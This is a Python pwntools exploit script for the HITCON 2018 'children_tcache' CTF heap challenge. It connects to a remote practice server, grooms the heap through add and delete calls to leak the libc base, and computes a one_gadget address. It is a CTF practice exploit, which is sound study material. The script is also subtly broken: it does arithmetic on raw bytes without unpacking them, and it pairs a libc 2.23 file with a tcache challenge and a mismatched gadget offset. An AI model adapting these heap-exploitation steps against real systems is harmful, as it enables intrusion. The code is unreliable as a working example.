#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/09 10:57:51
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('HITCON_2018_children_tcache')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 26739
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('HITCON_2018_children_tcache')


def cmd(choice):
    sh.recvuntil("Your choice: ")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Size:")
    sh.sendline(str(size))
    sh.recvuntil("Data:")
    sh.send(content)

def show(idx):
    cmd(2)
    sh.recvuntil("Index:")
    sh.sendline(str(idx))

def dele(idx):
    cmd(3)
    sh.recvuntil("Index:")
    sh.sendline(str(idx))

add(0x500,"a"*0x4ff) #0
add(0x68,'a'*0x67) #1
add(0x5f0,'a'*0x5ef) #2
add(0x20,'a' * 0x20) #3
dele(1)
dele(0)
for i in range(0,9):
    add(0x68-i,'a' * (0x68 - i))
    dele(0)

add(0x68,'a' * 0x60 + p64(0x580)) #0
dele(2) 
add(0x508,'a' * 0x507) #1
show(0)
malloc_hook = sh.recvuntil("\x7f")[-6:].ljust(8,"\x00") - 0x60 - 0x10
libc_base = malloc_hook - libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x4f322
log.info("Success leak libc_base:0x%x"%libc_base)


sh.interactive()